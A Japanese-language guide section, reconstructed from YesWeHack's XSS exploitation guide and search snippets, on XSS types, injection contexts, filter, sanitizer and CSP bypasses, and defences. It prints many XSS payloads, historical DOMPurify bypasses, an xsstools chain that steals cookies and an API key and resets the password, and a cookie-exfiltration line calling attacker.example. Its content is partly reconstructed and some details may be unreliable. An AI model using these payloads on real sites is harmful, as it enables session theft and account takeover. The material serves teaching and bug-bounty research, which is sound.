## YesWeHack XSS徹底ガイド

この節は、バグバウンティ（企業が脆弱性の報告に報奨金を払う制度）プラットフォーム YesWeHack が公開している総合ガイド *「XSS attacks & exploitation: The ultimate guide to cross-site scripting」* を典拠に、XSS（Cross-Site Scripting、クロスサイトスクリプティング＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させる脆弱性）を「攻撃者・ハンター（脆弱性を探す人）の視点」で体系化します。前節までの PortSwigger（防御・分類の教科書的解説）や OWASP（防御策の標準）と異なり、この資料の主張の中心は一貫して次の一点にあります。

> **「XSS は `alert(1)` を出して終わりではない。脆弱性を見つけたら、その影響を最大化するために時間を投資し、被害者のアカウントから価値あるデータを奪う『専用の JavaScript マルウェア』まで作り込め」**

つまりこの節は、「XSS をどう見つけるか」だけでなく「見つけた XSS をどこまで悪用（exploit）できるか＝どうやってバグバウンティの報奨を最大化するか」に踏み込む、実戦寄りの内容です。読者は反射型の素朴な XSS を知っている前提なので、分類の暗記ではなく **「なぜブラウザが攻撃者の文字列をコードとして再解釈してしまうのか」という仕組みのレベル**まで掘り下げます。

> ⚠️ **未取得の資料**: 「XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack）」は自動取得できませんでした（理由: 執筆環境のネットワーク下り〔egress〕プロキシが `www.yeswehack.com` への直接アクセス、および Wayback Machine・各種リーダープロキシ・`yeswehack.github.io` へのアクセスをブロックしたため、WebFetch でページ本文を直接取得できなかった）。以下のURLからユーザーご自身で直接ご覧ください: https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

**（以下は取得できなかった資料の補足として、一般的な知識に基づく解説です。ただし完全な創作ではなく、Web 検索で復元した当該ガイド本文のスニペット・章立て・具体的な主張と、直接取得できた一次資料〔YesWeHack の xsstools リポジトリ・cure53/DOMPurify の公式 Wiki など〕、および著者の専門知識を統合して再構成しています。原典の最新版で細部〔例文の値やバージョン記述〕が更新されている可能性があるため、正確な最新の記述は上記URLでご確認ください。）**

---

### XSSとは何か — バグハンター視点の定義

YesWeHack のガイドは XSS を、**CWE-79（Improper Neutralization of Input During Web Page Generation＝Web ページ生成時の入力の不適切な無害化）に分類される、Web アプリケーションの脆弱性クラス**として定義します。攻撃者が悪意ある JavaScript を、ユーザーに配信されるコンテンツの中に注入（inject）できてしまう問題であり、アプリケーションがユーザー入力を適切に検証（validate）またはエスケープ（escape＝特殊文字を無害な表現に置換）しないときに発生します。

この脆弱性が本質的に危険な理由は、**ブラウザが「注入されたコード」と「サイト本来のコード」を区別できない**点にあります。いったんページ内で実行された攻撃者の JavaScript は、そのサイトのオリジン（scheme＋host＋port の組）が持つ全権限で動きます。すなわちサイトの Cookie・進行中のセッション・DOM（Document Object Model＝ページを木構造で表したブラウザ内オブジェクト）に、正規スクリプトと同じ信頼で触れられます。ガイドはこれを端的に「XSS は被害者のブラウザに悪意ある JavaScript を感染させ、被害者のデータを奪ったり、アカウントを完全に乗っ取ったりするために使われる、極めてありふれた脆弱性だ」と表現します。

#### なぜ動くのか（原理）

原理はブラウザの **HTML パーサ（parser＝受け取った HTML 文字列を上から解析して DOM 木に変換する処理系）の挙動**にあります。パーサは文字列の「出所」を見ません。**構文（syntax）だけを見て解釈**します。したがって、ユーザー入力が応答 HTML に無害化されないまま出力され、それがパーサによって「単なるデータ」ではなく「マークアップ／実行すべきコード」として再解釈されると、XSS が成立します。この「データとして意図された文字列がコードとして再解釈される（context confusion＝文脈の取り違え）」という現象が、あらゆる XSS の共通メカニズムです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### XSSの類型 — 反射型・格納型・DOMベース・ブラインド・自己XSS

ガイドは XSS を「悪意あるスクリプトが**どの経路で**被害者のブラウザに届くか」で分類し、古典的な3類型（反射型・格納型・DOMベース）に加え、ハンターにとって重要な**ブラインドXSS**と**自己XSS**を取り上げます。

#### 反射型 XSS（Reflected XSS）

反射型は、**悪意あるユーザー入力がリクエストのプロパティ（URL パス、フラグメント〔`#` 以降〕、クエリ／ボディパラメータ、HTTP ヘッダなど）を通じて注入され、適切な無害化を経ずにその場でユーザーへ反射して返される**ときに発生します。サーバは入力を処理し、何のエンコードもせずに HTTP 応答に含めてしまうため、被害者が細工されたリンクを踏むと、そのブラウザで攻撃者のスクリプトが実行されます。

ペイロードはどこにも保存されないので、攻撃には**配信ステップ**が必要です。攻撃者は悪意あるリンクを作り、被害者にクリックさせます。

```
https://example.com/search?q=<script>alert(document.domain)</script>
```

> なぜ動くのか: `q` パラメータの値が検索結果ページの HTML ボディにそのまま埋め込まれ、パーサが `<script>` を「実行すべきスクリプト要素」として解釈するため。`document.domain` を出すのは、どのオリジンで実行されているかを証明し「単なる `alert(1)` 以上の実証」にするため。

#### 格納型 XSS（Stored XSS）

格納型は、注入されたスクリプトが**標的サーバに永続的に保存される**（データベース、掲示板、訪問者ログ、コメント欄など）タイプです。被害者が保存済みの情報を要求したときに、そのスクリプトがサーバから配信され実行されます。反射型と違い**被害者に特定のリンクを踏ませる必要がない**ため、一つのペイロードで複数の被害者に影響し得る点で特に危険だとガイドは強調します。

#### DOMベース XSS（DOM-based XSS）

DOMベースは、**安全でないクライアント側 JavaScript が、ユーザーが制御可能なデータ（DOMソース）を処理し、それを危険な代入先（DOMシンク）に渡す**ときに発生します。ガイドが繰り返し強調する最重要ポイントは次です。

> **DOMベース XSS のペイロードは「サーバに一度も到達しない」。攻撃チェーン全体がブラウザ内で完結するため、サーバ側のロギング・WAF（Web Application Firewall＝Web 用の防御装置）・バックエンド監視はこの攻撃を一切観測できない（blind）。**

これは、JavaScript を実行しない自動スキャナが DOMベース XSS を見逃しやすい理由でもあり、逆にハンターにとっては「サーバ側 WAF に阻まれずに刺さる」旨味のある攻撃面です。

**ソース（source）**とは、攻撃者が制御できるデータの入口です。代表例:

- `location.search`（`?` 以降のクエリ文字列）、`location.hash`（`#` 以降のフラグメント）、`location.href`
- `document.referrer`（遷移元 URL）
- `window.name`
- `document.cookie`
- `localStorage` / `sessionStorage`
- `postMessage` で受け取ったデータ
- WebSocket の `onmessage` データ

**シンク（sink）**とは、渡された文字列を「実行・レンダリング」してしまう危険な関数・プロパティです。代表例:

- `eval()`、`Function()`、`setTimeout()`/`setInterval()` に文字列を渡す形
- `document.body.innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write()`
- `element.setAttribute()` で `href`/`src`/`on*` を設定、`location`/`location.href` への代入

典型的な脆弱コードとペイロード:

```javascript
// 脆弱なコード（フラグメントを innerHTML に流し込む）
document.getElementById('out').innerHTML = location.hash.slice(1);
```
```
https://example.com/page#<img src=x onerror=alert(1)>
```

> なぜ動くのか: `location.hash`（ソース）で受け取った攻撃者制御文字列を `innerHTML`（シンク）に代入すると、ブラウザがその文字列を HTML として再パースする。`<img>` の読み込みは `src=x` で必ず失敗し、その失敗時に `onerror` ハンドラが発火して JavaScript が実行される。`<script>` タグは `innerHTML` 代入では実行されない（HTML 仕様の制約）ため、`onerror` のようなイベントハンドラ経由を使うのが定石。

#### ブラインド XSS（Blind XSS）

ブラインド XSS は、注入したスクリプトが**攻撃者自身のブラウザでは即座に実行されず、後から、別のコンテキストで発火する**格納型 XSS の一種です。典型は、問い合わせフォームやユーザーエージェント（User-Agent ヘッダ）に仕込んだペイロードが、後で**管理者だけが見る内部管理画面**でレンダリングされて発火するケースです。

ガイドはブラインド XSS の影響について重要な指摘をします。

> **ブラインド XSS の影響は、通常「高い権限を持つ被害者（管理者など）」を感染させる事実によって著しく増幅される。彼らはアプリケーションの制限区域にアクセスできるからだ。**

攻撃者はペイロードが「いつ・どこで」発火したか分からないため、実務では XSS Hunter のような**アウトオブバンド（out-of-band＝別チャネル）で発火を通知するコールバック型ペイロード**を使います。例えば、発火時に攻撃者サーバへ現在の URL・Cookie・DOM のスクリーンショットを送るスクリプトを注入しておきます。

#### 自己 XSS（Self-XSS）

自己 XSS は、**攻撃者が自分自身のブラウザにしか JavaScript を注入できない**タイプです（例: 自分のプロフィール欄に入れた値が自分のページでだけ実行される）。それ単体では他人を害せないため、多くのプログラムで低評価・対象外とされます。しかしガイドが説くのは**エスカレーション（escalation＝影響の格上げ）**の発想です。自己 XSS を **CSRF（Cross-Site Request Forgery＝クロスサイトリクエストフォージェリ、被害者に意図しないリクエストを送らせる攻撃）と連鎖**させ、「被害者のアカウントに攻撃者のペイロードを書き込ませてから発火させる」ことで、通常の（他者に効く）XSS 相当まで影響を引き上げられます。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### 注入コンテキストを見極める

ガイドが実戦の土台として重視するのが**注入コンテキスト（injection context＝あなたの入力が最終的に HTML／JS のどの構文位置に落ちるか）**の特定です。「どんな万能ペイロードを撃つか」ではなく、「**自分の入力が今どの文脈に入っているか**」を先に確定させることが、正しいペイロードを選ぶ唯一の方法だと説きます。

**コンテキストの確定手順**: ページの**ソース（View Source。DevTools のインスペクタが表示する『再構築後の DOM』ではなく、サーバが返した生 HTML）**の中で自分が入れた一意な文字列（例: `zzqxss1`）を検索し、**その前後に何があるか**を見ます。これで「HTML ボディの中か」「属性値の中（引用符は `"` か `'` か）」「`<script>` の中の JS 文字列か」「`href` の中か」が判別できます。

#### HTML ボディコンテキスト

入力が要素と要素の間（テキストノード）に落ちる場合。新しいタグを直接開けます。

```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```
> なぜ動くのか: パーサは注入文字列を新しい要素として解釈する。`<script>` がフィルタで弾かれても、画像読み込み失敗（`onerror`）や SVG 読み込み完了（`onload`）などのイベントハンドラを持つタグなら、`<script>` という語を一切使わずに JS を実行できる。

#### HTML 属性コンテキスト

入力が既存タグの属性値に落ちる場合。まず引用符と山括弧で属性・タグを**抜け出す（break out）**必要があります。

```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```
> なぜ動くのか: 先頭の `">` で今いる属性値と開始タグを閉じ、パーサを「タグの外＝新しいマークアップを書ける状態」に戻す。もし山括弧がエンコードされてブレイクアウトできない場合は、次のように**同じ属性の中でイベントハンドラを新設**する手もある。

```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```
> なぜ動くのか: `"` で属性値だけを閉じ、続けて同じタグに `onmouseover`/`onfocus` 属性を追加する。`autofocus` と `onfocus` の組み合わせは、ユーザー操作を待たずに要素がフォーカスを得た瞬間に自動発火するため、被害者のマウス移動が不要になる。

#### `href`（URL）コンテキストと `javascript:` 擬似プロトコル

入力がリンクの `href` に落ちる場合、山括弧も引用符も使わずに実行できます。

```html
<a href="javascript:alert(document.domain)">click</a>
```
> なぜ動くのか: `javascript:` は擬似プロトコル（pseudo-protocol）で、ブラウザはこの URI が「ナビゲーション」されると続く JavaScript を実行する。ガイドは「**CSP が強制されていなければ**、`javascript:alert(1)` でコード実行が可能」と明記している（CSP がある場合は後述の通り遮断され得る）。

#### JavaScript 文字列コンテキスト

入力が既存の `<script>` 内の文字列リテラルに落ちる場合。

```javascript
var x = 'ここに入る';
```
```javascript
';alert(1)//
```
> なぜ動くのか: `'` で文字列リテラルを閉じ、`;` で文を区切って `alert(1)` を新しい文として実行し、`//` で後続の元コード（閉じ引用符など）をコメントアウトして構文エラーを防ぐ。

ES6 のテンプレートリテラル（バッククォート `` ` ``）内なら、閉じずとも `${...}` で式が評価されます。

```javascript
${alert(1)}
```
> なぜ動くのか: テンプレートリテラル内の `${式}` は文字列連結時に評価される。引用符を閉じる必要がないため、`'` や `"` をエスケープするフィルタを回避できる。

#### ポリグロット（polyglot）

複数のコンテキストで同時に成立するよう設計された「万能弾」です。ソースが見えない状況やスキャナ運用で時間を節約できます。有名な 0xsobky のポリグロットのように、`javascript:`・コメント・イベントハンドラ・複数タグを1本に詰め込みます。ただしガイドの立場は「ポリグロットは初動の探索には有用だが、**確実な実行にはコンテキストを特定して専用ペイロードを組む方が堅い**」というものです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### XSSを見つける — 検出とファジング

#### 反射の確認とファジング

黒箱（内部コードが見えない状態）でのアプローチとして、ガイドは姉妹資料の黒箱テスト手法（下記出典）に沿った**ファジング（fuzzing＝多数の入力を機械的に投げて異常応答を探す手法）**を紹介します。ファザには2系統あります。

- **生成ベース（generation-based）**: 仕様や文法から入力を一から生成する。
- **変異ベース（mutation-based）**: 直近で使った入力を少しずつ改変して次の入力を作る。

XSS では、まず一意なマーカー文字列を各パラメータに送り、応答のどこに・どの形で反射するかを確認し、次にコンテキストに応じた特殊文字（`< > " ' `` ` /` など）を段階的に投入して「どの文字が生きて（エンコードされず）通るか」を絞り込みます。

> 出典: Black Box Testing Techniques for Web Applications（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/black-box-testing-techniques-web-application

#### DOMベース XSS の追跡と DOM Invader

DOMベース XSS はソースがサーバに残らないため、ブラウザ内でソースからシンクへの**データフローを追跡**して見つけます。ガイドは次の道具立てを推奨します。

- **ブラウザの開発者コンソール／デバッガ**: シンク関数（`eval`、`innerHTML` 代入など）にブレークポイントを置き、そこへ流れ込む値の出所（コールスタック）を遡る。
- **DOM Invader（PortSwigger 内蔵のブラウザ拡張）**: DevTools にタブを追加し、**ソースからシンクへの経路をリアルタイムで自動追跡**する。制御可能なシンクを、そのコンテキスト（属性・HTML・URL・JS のどれか）と適用済みサニタイズの有無つきで一覧化する。さらに `postMessage` のテスト、プロトタイプ汚染（prototype pollution）、DOM clobbering（HTML の `id`/`name` で JS 変数を上書きする技法）の検出も行う。

DOM Invader の使い方の勘所は、まず「canary（カナリア＝一意な目印文字列）」をページに注入させ、それがどのシンクに到達したかを拡張に報告させることです。到達が確認できたら、そのシンクのコンテキストに合わせたペイロードへ差し替えて実行を狙います。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide ／ Testing for DOM XSS（PortSwigger DOM Invader ドキュメント） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss

---

### 防御を回避する — WAF・サニタイザ・CSP

見つけた注入点が「素の `<script>` では弾かれる」ことは実務では普通です。ガイドは3種類の防御と、その回避の考え方を扱います。

#### WAF・入力フィルタの回避

WAF は既知の攻撃パターン（シグネチャ）で入力をブロックします。ガイドの基本姿勢は次の通りです。

> **WAF の内部処理を知らずに一発でバイパスするペイロードを作ることはできない。だが、代表的なペイロードを投げてその『ブロック／通過』の反応を観察することで、WAF の構成を偵察（recon）できる。**

つまり、ペイロードを少しずつ変えては「弾かれたか／通ったか」のフィードバックを得て、次の調整に活かす反復プロセスです。基本テクニック:

- **タグ／イベントの言い換え**: 多くの素朴なフィルタは `<script>` だけを弾き、イベントハンドラ付きの他タグ（`<img onerror>`、`<svg onload>`、`<details ontoggle>` 等）を見逃す。
- **大文字小文字・エンコードの混在**: `<ScRiPt>`、HTML エンティティ（`&#x61;` 等）、URL エンコードの多重化。
- **チャンク分割**: WAF がリクエストをチャンク単位で個別に検査する場合、ペイロードを複数チャンクに分割すると WAF は完全な形を見られない。一方でバックエンドは処理前に再結合するため成立する。

> 出典: Guide on Web Application Firewall Bypass（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/web-application-firewall-bypass

#### サニタイザの回避と Mutation XSS（mXSS）

サニタイザ（sanitizer＝入力に含まれる危険な要素・属性を除去して「安全な HTML」を返すライブラリ。代表例 DOMPurify）を相手にする場合、鍵となるのが **mutation XSS（mXSS、変異型 XSS）**です。原理は次の通りです。

> **同じマークアップでも、それが解析される『名前空間（namespace）』の文脈によって意味が変わる。サニタイザは入力をある文脈で検査して「安全」と判定するが、ブラウザはその出力を `innerHTML` 代入時に別の文脈で再パースし、異なる DOM 木を生成してしまう。結果、サニタイズ後の文字列から実行可能な JavaScript が『生えてくる（mutate）』。**

ここでいう名前空間とは、HTML・SVG・MathML という3つのパース規則の系のことです。`<a>` タグは HTML 名前空間では別の `<a>` の子になれず外へ押し出される（pop out）が、SVG 名前空間から HTML へ平坦化された `<a>` は押し出されない、といったズレが「変異ガジェット（mutation gadget）」になります。サニタイザ検査時とブラウザ再パース時とで、要素の所属名前空間がすり替わることで無害な木が有害な木に変わるのです。

YesWeHack はこの領域向けに、各種 HTML パーサ／サニタイザ（Ammonia、Angular、DOMPurify、JsXss、SafeValues 等）へ同一入力を通して差分を観察できる Web ツール **Dom-Explorer** を提供しており、ガイドでも mXSS の実験に活用できると紹介しています。

**バージョン依存の実例（陳腐化に注意）** — 以下はいずれも**すでに修正済み**の歴史的バイパスで、現行版では通用しません。攻撃研究としてではなく「なぜサニタイザが破れうるか」の理解のために示します。

- **DOMPurify < 2.0.17（2020年、発見: Michał Bentkowski / Securitum）— MathML 名前空間混同**
  ```html
  <form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
  ```
  > なぜ動くのか: `mglyph` の直接の親を「HTML 名前空間の `form`」から「MathML の `mtext`」へすり替える所有権変異（ownership mutation）を用いる。HTML 仕様では MathML text integration point（`mtext` など）の子は原則 HTML 名前空間になるが、`mglyph` と `malignmark` だけは例外で、しかも直接の子である場合に限る。この差により、DOMPurify がサニタイズした木では `mglyph` 配下が HTML 名前空間にあるのに、ブラウザの最終 DOM では MathML 名前空間に移り、`<style>` 内に隠していた `<img onerror>` が実要素として復活する。修正版 2.0.17 では「各ノードを親の名前空間と照合する」検証が導入され、これが長らく標準的な緩和策となった。

- **DOMPurify < 2.2.2（2020年11月、発見: Daniel Santos）— SVG からの往復による名前空間混同**
  ```html
  <math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
  ```
  > なぜ動くのか: SVG 名前空間で安全に見えるタグ列を組み、それが HTML/MathML へ移し替えられる際に、`<style>` 内のコメント `<!--` と属性値中の `-->` が再パースで境界を崩し、隠していた `<img onerror>` が実 DOM に出現する。報告からわずか約11分で修正パッチがテストされ、同日中に 2.2.2 として公開されたという逸話つきの事例。
  > 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f

- **DOMPurify（2024年）— ネスト深度チェックの弱体化とプロトタイプ汚染の連携（CVE-2024-45801 / CVE-2024-47875）**: 深いネスト（入れ子）を利用した mXSS と、`Object.prototype` を汚染して内部のネスト深度チェックを弱める手法の組み合わせ。ライブラリの安全確認ロジックそのものを狙う世代の攻撃。
- **DOMPurify 3.0.1〜3.3.3 — プロトタイプ汚染（CVE-2026-41238、修正: 3.4.0）**: `Object.prototype` に `tagNameCheck`/`attributeNameCheck` を注入することで任意のカスタム要素を許可させる。3.4.0 で「プロトタイプに依存しない初期化」により修正。

これらから得るべき教訓は明確です。**「サニタイザは常に特定バージョンの特定パーサ挙動に依存しており、ブラウザの HTML パース仕様の隅（名前空間・integration point・コメント境界）を突く新種の mXSS が周期的に見つかる。ゆえに使うライブラリは必ず最新版に追随し、CSP など多層防御と併用せよ」**ということです。

> 出典: Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass（Michał Bentkowski / Securitum Research） — https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/ ／ Bypassing DOMPurify again with mutation XSS（Gareth Heyes / PortSwigger Research） — https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss ／ Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki

#### CSP の評価と回避

**CSP（Content Security Policy＝コンテンツセキュリティポリシー）**は、ブラウザが「どのリソースを読み込み・実行してよいか」を宣言するヘッダで、XSS の**最後の砦**です。ガイドは「たとえ攻撃者が悪意あるコードの注入に成功しても、適切に構成された CSP はその実行を阻止でき、脅威を実質無力化しうる」と位置づけます。だからこそ「`javascript:alert(1)` は **CSP がなければ**動く」という注記が随所に現れます。

CSP の**評価の仕組み**は、`script-src` などのディレクティブに列挙された**ソース許可リスト（allowlist）**に、実行しようとするスクリプトの出所が合致するかをブラウザが照合する、というものです。ここに構成ミスがあると回避されます。

- **`unsafe-inline` が付いている**: インラインスクリプトやイベントハンドラが許可され、CSP はほぼ意味をなさない。
- **許可リストに JSONP エンドポイントや緩い CDN が含まれる**: 例えば許可された CDN 上の Angular などのライブラリを悪用してコールバックを実行させる「CSP ガジェット」により、許可オリジン内から任意コードを走らせる。
- **`strict-dynamic` や nonce（number used once＝1回限りの乱数トークン）が無い旧式の許可リスト方式**: ドメイン許可リストは上記の理由で破られやすい。

したがって回避可能性は「許可リストに何が載っているか」の評価順で決まり、**厳格な CSP（nonce ＋ `strict-dynamic`）**はこれら多くのペイロードを封じます。ガイドの結論は「強固な CSP は攻撃のハードルを大きく上げるが、`unsafe-inline`・JSONP・許可 CDN といった構成ミスがあれば回避され得る」というものです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### 影響を最大化する — `alert(1)` を超えて

ここがこのガイドの真骨頂です。ガイドは繰り返し「XSS を見つけたら `alert(1)` で満足せず、影響の最大化に時間を投資し、被害者アカウントから価値あるデータを奪う**専用の JavaScript マルウェア**を作れ」と説きます。バグバウンティでは、実証（PoC）の完成度が報奨額を左右するからです。

#### xsstools フレームワーク（YesWeHack 製）

ペイロードを手書きすると、エンコード地獄・文字数制限・非同期処理の記述が煩雑になります。YesWeHack はこれを解決する OSS の**XSS 悪用フレームワーク xsstools** を公開しており、ガイドの悪用パートの中核として紹介しています。設計思想は「**強力なペイロードを素早く生成し、エンコード不要で多数のラッパーを使い回せるようにする**」ことです。主要コンポーネントは以下です（以下のコード例は xsstools 公式リポジトリから直接取得したもの）。

**1. Payload（攻撃ロジックの記述）** — 「クッキー取得 → DOM 解析 → パスワード変更」を宣言的に連鎖できます。

```javascript
const exfiltrator = Exfiltrators.message()
const payload = Payload.new()
    .addExfiltrator(exfiltrator)
    .eval(() => document.cookie)               // 被害者の Cookie を取得
    .exfiltrate()                              // 攻撃者へ送出
    .fetchDOM("/user/me")                      // 認証済みページを裏で取得
    .querySelector("input[name='apikey']", 'value')  // APIキーを抜き出す
    .exfiltrate()
    .postUrlEncoded("/user/changePassword", {"password": "hacked"})  // パスワード変更
```
> なぜ動くのか: すべて被害者のオリジン・セッションで実行されるため、`fetchDOM` は被害者の Cookie 付きで認証済みページを取得でき、そこから APIキーのような機微値を DOM 抽出できる。最後の `postUrlEncoded` は被害者権限で状態変更（パスワード変更）を行い、実質的なアカウント乗っ取りを自動化する。

**2. Exfiltrator（データ流出チャネル）** — 攻撃者サーバへデータを送る経路を選べます。`message`（`postMessage`）、`get`/`post`/`postJSON`（fetch API）、`sendBeacon`（`navigator.sendBeacon`）、`console`（デバッグ用）、`img`/`style`/`iframe`（タグ生成による送出）。
> なぜ複数用意するのか: CSP の `connect-src` が絞られていて fetch が塞がれていても、`img` の `src` 読み込みや `sendBeacon` なら通ることがあるなど、環境ごとに「生き残る」流出路が異なるため。

**3. Wrapper（配送形態へのカプセル化）** — 出来上がったペイロードを注入点の形に合わせて包みます。`minify()`（最小化）、`templateString()`、`imgLoad()`、`innerHTML()`、`script()`、`iframe()` などを鎖状に適用できます。

```javascript
const wrapper = Wrapper.new()
    .minify()
    .templateString()
    .imgLoad()
    .innerHTML()
    .script()
    .iframe()

const exploit = wrapper.wrap(payload)
```
> なぜ動くのか: 注入コンテキスト（HTML ボディか、`innerHTML` シンクか、`<script>` 内か）に応じて必要な包み方が違う。ラッパーがエンコードと構文の帳尻を自動で合わせるため、手作業のエスケープミスを避けられる。

**4. ClickJacker（クリックジャッキング連鎖）** — クリックジャッキング（透明な iframe を重ねて被害者に意図しないクリックをさせる攻撃）のコードは本来煩雑ですが、xsstools では対象要素の座標を渡すだけで組めます。

```javascript
const cj = new ClickJacker(url)
cj.addStep({x: 42, y: 34, width: 64, height: 35})
await cj.run()
```
> なぜ動くのか: 標的ページを不可視の iframe で読み込み、指定座標の操作を段階的に自動実行することで、XSS だけでは届かない「ユーザー確認を伴う操作」まで連鎖させられる。

> 出典: yeswehack/xsstools（GitHub リポジトリ README） — https://github.com/yeswehack/xsstools

#### Cookie 窃取とセッション乗っ取り

最も古典的な悪用です。被害者の Cookie を攻撃者サーバへ送り、そのセッションを乗っ取ります。

```javascript
new Image().src = 'https://attacker.example/c?='+encodeURIComponent(document.cookie);
```
> なぜ動くのか: `document.cookie` を画像 URL のクエリに載せて送出する。画像リクエストは CSP の `img-src` が緩ければ通りやすく、非同期で目立たない。ただし **`HttpOnly` 属性の付いた Cookie は `document.cookie` から読めない**（これが後述の防御の要点）。

`HttpOnly` で Cookie が読めない場合でも、次項のように「被害者のブラウザを踏み台にした操作」で影響を出せる点をガイドは強調します。

#### アカウント乗っ取りへのエスカレーション

セッション ID を盗めなくても、**XSS は被害者のブラウザ内で被害者権限の任意操作を実行できる**ため、次の手が定石です。

1. XSS で被害者の**メールアドレスまたは電話番号を攻撃者のものに変更**する（プロフィール更新 API を叩く）。
2. その後、**パスワードリセット（forgot password）機能**を使ってパスワードを更新し、恒久的にアカウントを掌握する。

これは `HttpOnly` や短命セッションを回避してもなお成立する、影響度の高いエスカレーションです。前掲の xsstools の連鎖（`fetchDOM` → 値抽出 → `postUrlEncoded`）はまさにこの自動化を意図しています。

#### ブラインド XSS と高権限被害者

ブラインド XSS では、発火先が管理画面であることが多く、被害者が管理者権限を持つため影響が跳ね上がります。ガイドの実務的助言は、**発火時に「現在 URL・DOM・スクリーンショット・（読めれば）Cookie」を攻撃者サーバへ自動送信するペイロードを仕込み、いつどこで刺さったかを可視化せよ**、というものです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### 防御策 — ハンター視点から逆算する

攻撃を知り尽くしたうえで、ガイドが示す（そして上で見た攻撃を封じる）防御は次の多層構造です。

- **出力エンコーディング（output encoding）を、出力先コンテキストごとに正しく行う**: HTML ボディ・属性・JS 文字列・URL では必要なエスケープが異なる。「入力時のサニタイズ一発」ではなく「出力時にコンテキストへ合わせて無害化」が原則。DOM 操作では危険なシンク（`innerHTML` 等）を避け、`textContent` など安全な API を使う。
- **信頼できるサニタイザライブラリを最新版で使う**: 自前の正規表現フィルタは mXSS で破られる。DOMPurify のような専用ライブラリを、上述のバージョン依存バイパスを踏まえて**必ず最新に追随**して用いる。
- **厳格な CSP（nonce ＋ `strict-dynamic`）を敷く**: ドメイン許可リスト方式は JSONP／許可 CDN ガジェットで破られやすい。nonce ベースにし、`unsafe-inline` を排除する。さらに `require-trusted-types-for 'script'`（Trusted Types。危険なシンクへ生文字列を渡すこと自体を型で禁止する仕組み）を併用すると、DOM XSS の多くを構造的に封じられる（ただし完全ではなく回避例もある）。
- **認証トークンは `localStorage` ではなく `HttpOnly` Cookie に置く**: `HttpOnly` により JavaScript から読めなくなり、素朴な Cookie 窃取を無効化できる。
- **WAF は補助線に過ぎないと理解する**: 既知バイパスが多数存在し新手も絶えないため、WAF は単独の防御にはならない。入力検証・出力エンコード・CSP と組み合わせた「一層」として扱う。

ガイドの締めの主張は、攻撃側の思想と表裏一体です。**「XSS は本質的にコンテキスト（文脈）の問題である。攻撃者はコンテキストを取り違えさせてコード実行に持ち込み、防御側はコンテキストごとに正しく無害化することで防ぐ。そして XSS の真の危険は `alert(1)` ではなく、その先の『被害者になりすました自動化された乗っ取り』にあるのだから、防御も攻撃も同じ深さで理解しておかねばならない」**ということです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### この節のまとめ（要点の再確認）

- **XSS = コンテキストの取り違え**: ブラウザのパーサが「データ」を「コード」として再解釈することで成立する（CWE-79）。反射型・格納型・DOMベース・ブラインド・自己 XSS の違いは「経路」の違い。
- **DOMベースはサーバに届かない**ため WAF・サーバ監視に見えず、`location.hash` などソースから `innerHTML` などシンクへの流れを DOM Invader 等で追う。
- **実行の鍵はコンテキスト特定**: HTML ボディ・属性・`href`（`javascript:`）・JS 文字列／テンプレートリテラルで撃つべきペイロードが違う。`<script>` が弾かれてもイベントハンドラ（`onerror`/`onload`/`onfocus`）で実行できる。
- **防御回避**: WAF は反応を見て偵察、サニタイザは名前空間混同による mXSS で破れる（DOMPurify < 2.0.17 / < 2.2.2 などは修正済み・要最新版追随）、CSP は許可リストの構成ミス（`unsafe-inline`・JSONP・許可 CDN）で回避され得る。
- **`alert(1)` で終わらせない**: xsstools でメール変更→パスワードリセットによるアカウント乗っ取りや、クリックジャッキング連鎖、ブラインド XSS での高権限奪取まで作り込むのが、この資料が説く「影響の最大化」。
- **防御の逆算**: コンテキスト別の出力エンコード、最新サニタイザ、nonce ＋ `strict-dynamic` の厳格 CSP＋Trusted Types、`HttpOnly` Cookie、そして WAF を過信しない多層防御。
